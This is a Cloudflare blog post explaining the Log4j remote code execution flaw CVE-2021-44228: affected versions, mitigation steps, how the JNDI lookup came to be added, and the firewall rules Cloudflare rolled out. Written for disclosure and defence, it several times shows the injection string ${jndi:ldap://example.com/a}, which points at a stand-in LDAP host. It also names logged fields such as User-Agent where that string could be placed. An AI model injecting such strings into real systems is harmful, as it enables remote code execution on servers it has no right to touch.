<div class="mb2 gray5">4 min read</div>
<div class="mt4">This post is also available in <a href="https://blog.cloudflare.com/zh-cn/inside-the-log4j2-vulnerability-cve-2021-44228">简体中文</a>, <a href="https://blog.cloudflare.com/fr-fr/inside-the-log4j2-vulnerability-cve-2021-44228">Français</a>, <a href="https://blog.cloudflare.com/de-de/inside-the-log4j2-vulnerability-cve-2021-44228">Deutsch</a>, <a href="https://blog.cloudflare.com/ja-jp/inside-the-log4j2-vulnerability-cve-2021-44228">日本語</a>, <a href="https://blog.cloudflare.com/ko-kr/inside-the-log4j2-vulnerability-cve-2021-44228">한국어</a> and <a href="https://blog.cloudflare.com/zh-tw/inside-the-log4j2-vulnerability-cve-2021-44228">繁體中文</a>.</div><img class="mr2" src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/2tLB9TMOv2bITmqHSEujLn/8c6a8f1ff08032204010b510d01f4024/inside-the-log4j2-vulnerability-cve-2021-44228.png" alt="">
<div class="post-content lh-copy gray1">
	<p><i>In previous versions of this blog post slightly different mitigation techniques were recommended. The Apache Log4j project has updated their official guidance and we have updated this blog post in line with their recommendations</i></p>
	<p>Yesterday, December 9, 2021, a very serious vulnerability in the popular Java-based logging package <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228">Log4j</a> was disclosed. This vulnerability allows an attacker to execute code on a remote server; a so-called <a href="https://www.cloudflare.com/learning/security/what-is-remote-code-execution">Remote Code Execution (RCE)</a>. Because of the widespread use of Java and Log4j this is likely one of the most serious vulnerabilities on the Internet since both <a href="https://blog.cloudflare.com/tag/heartbleed">Heartbleed</a> and <a href="https://blog.cloudflare.com/inside-shellshock">ShellShock</a>.</p>
	<p>It is <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228">CVE-2021-44228</a> and affects version 2 of Log4j between versions 2.0-beta-9 and 2.14.1. It is patched in 2.16.0.</p>
	<p>In this post we explain the history of this vulnerability, how it was introduced, how Cloudflare is protecting our clients. <a href="https://blog.cloudflare.com/actual-cve-2021-44228-payloads-captured-in-the-wild">Details of actual attempted exploitation</a> we are seeing blocked by our firewall service are in a separate blog post.</p>
	<p>Cloudflare uses some Java-based software and our teams worked to ensure that our systems were not vulnerable or that this vulnerability was mitigated. In parallel, we rolled out firewall rules to protect our customers.</p>
	<p>But, if you work for a company that is using Java-based software that uses Log4j you should immediately read the section on how to mitigate and protect your systems before reading the rest.</p>
	<div class="flex anchor relative">
		<h3 id="how-to-mitigate-cve-2021-44228">How to Mitigate CVE-2021-44228</h3>
		<a href="https://blog.cloudflare.com/#how-to-mitigate-cve-2021-44228" aria-hidden="true" class="relative sm:absolute sm:-left-5">
			<svg width="16" height="16" viewBox="0 0 24 24">
				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
			</svg>
		</a>
	</div>
	<p>Implement one of the following mitigation techniques: &nbsp;Java 8 (or later) users should upgrade to release 2.16.0. Java 7 users should upgrade to release 2.12.2.</p>
	<p>Otherwise, in any release other than 2.16.0, you may remove the <code>JndiLookup</code> class from the <code>classpath: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</code></p>
	<div class="flex anchor relative">
		<h3 id="vulnerability-history">Vulnerability History</h3>
		<a href="https://blog.cloudflare.com/#vulnerability-history" aria-hidden="true" class="relative sm:absolute sm:-left-5">
			<svg width="16" height="16" viewBox="0 0 24 24">
				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
			</svg>
		</a>
	</div>
	<p>In 2013, in <a href="https://blogs.apache.org/logging/entry/apache_log4j_2_0_beta9">version 2.0-beta9</a>, the Log4j package added the “JNDILookup plugin” in issue <a href="https://issues.apache.org/jira/browse/LOG4J2-313">LOG4J2-313</a>. To understand how that change creates a problem, it’s necessary to understand a little about <a href="https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface">JNDI</a>: Java Naming and Directory Interface.</p>
	<p>JNDI has been present in Java since the late 1990s. It is a directory service that allows a Java program to find data (in the form of a Java object) through a directory. JNDI has a number of service provider interfaces (SPIs) that enable it to use a variety of directory services.</p>
	<p>For example, SPIs exist for the CORBA COS (Common Object Service), the Java RMI (Remote Method Interface) Registry and LDAP. LDAP is a very popular directory service (the Lightweight Directory Access Protocol) and is the primary focus of CVE-2021-44228 (although other SPIs could potentially also be used).</p>
	<p>A Java program can use JNDI and LDAP together to find a Java object containing data that it might need. For example, in the standard Java documentation there’s an <a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/examples/directory.html">example</a> that talks to an LDAP server to retrieve attributes from an object. It uses the URL <code>ldap://localhost:389/o=JNDITutorial</code> to find the JNDITutorial object from an LDAP server running on the same machine (localhost) on port 389 and goes on to read attributes from it.</p>
	<p>As the tutorial says “<i>If your LDAP server is located on another machine or is using another port, then you need to edit the LDAP URL</i>”. Thus the LDAP server could be running on a different machine and potentially anywhere on the Internet. That flexibility means that if an attacker could control the LDAP URL they’d be able to cause a Java program to load an object from a server under their control.</p>
	<p>That’s the basics of JNDI and LDAP; a useful part of the Java ecosystem.</p>
	<p>But in the case of Log4j an attacker can control the LDAP URL by causing Log4j to try to write a string like <code>${jndi:ldap://example.com/a}</code>. If that happens then Log4j will connect to the LDAP server at example.com and retrieve the object.</p>
	<p>This happens because Log4j contains <a href="https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution">special syntax</a> in the form <code>${prefix:name}</code> where <code>prefix</code> is one of a number of different <a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">Lookups</a> where <code>name</code> should be evaluated. For example, <code>${java:version}</code> is the current running version of Java.</p>
	<p><a href="https://issues.apache.org/jira/browse/LOG4J2-313">LOG4J2-313</a> added a <code>jndi</code> Lookup as follows: “The JndiLookup allows variables to be retrieved via JNDI. By default the key will be prefixed with java:comp/env/, however if the key contains a ":" no prefix will be added.”</p>
	<p>With a : present in the key, as in <code>${jndi:ldap://example.com/a}</code> there’s no prefix and the LDAP server is queried for the object. And these Lookups can be used in both the configuration of Log4j as well as when lines are logged.</p>
	<p>So all an attacker has to do is find some input that gets logged and add something like &nbsp;<code>${jndi:ldap://example.com/a}</code>. This could be a common HTTP header like <code>User-Agent</code> (that commonly gets logged) or perhaps a form parameter like <code>username</code> that might also be logged.</p>
	<p>This is likely very common in Java-based Internet facing software that uses Log4j. More insidious is that non-Internet facing software that uses Java can also be exploitable as data gets passed from system to system.</p>
	<p>For example, a User-Agent string containing the exploit could be passed to a backend system written in Java that does indexing or data science and the exploit could get logged. This is why it is vital that all Java-based software that uses Log4j version 2 is patched or has mitigations applied immediately. Even if the Internet-facing software is not written in Java it is possible that strings get passed to other systems that are in Java allowing the exploit to happen.</p>
	<figure class="kg-card kg-image-card kg-width-wide">

		<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/4gTLQSjXHxMPpuJw2IHAEj/b2b2fa00cda32b51350817f683b53362/Exploit-activated.png" alt="Even if the Internet-facing software is not written in Java it is possible that strings get passed to other systems that are in Java allowing the exploit to happen." class="kg-image" width="1268" height="338" loading="lazy">

	</figure>
	<p>Or imagine a Java-based billing system that logs when the customer's first name is not found. A malicious user might create an order with a first name that contains the exploit, and it might take multiple hops (and a lot of time) to make it from the web server, via a customer database and into the billing system where it finally executes.</p>
	<p>And Java is used for many more systems than just those that are Internet facing. For example, it’s not hard to imagine a package handling system that scans QR codes on boxes, or a contactless door key both being vulnerable if they are written in Java and use Log4j. In one case a carefully crafted QR code might contain a postal address containing the exploit string; in the other a carefully programmed door key could contain the exploit and be logged by a system that keeps track of entries and exits.</p>
	<p>And systems that do periodic work might pick up the exploit and log it later. So the exploit could lay dormant until some indexing, roll-up, or archive process written in Java inadvertently logs the bad string. Hours or even days later.</p>
	<div class="flex anchor relative">
		<h3 id="cloudflare-firewall-protection">Cloudflare Firewall Protection</h3>
		<a href="https://blog.cloudflare.com/#cloudflare-firewall-protection" aria-hidden="true" class="relative sm:absolute sm:-left-5">
			<svg width="16" height="16" viewBox="0 0 24 24">
				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
			</svg>
		</a>
	</div>
	<p>Cloudflare rolled out protection for our customers using our <a href="https://www.cloudflare.com/waf">Firewall</a> in the form of rules that block the <code>jndi</code> Lookup in common locations in an HTTP request. This is detailed <a href="https://blog.cloudflare.com/cve-2021-44228-log4j-rce-0-day-mitigation">here</a>. We have continued to refine these rules as attackers have modified their exploits and will continue to do so.</p>
</div>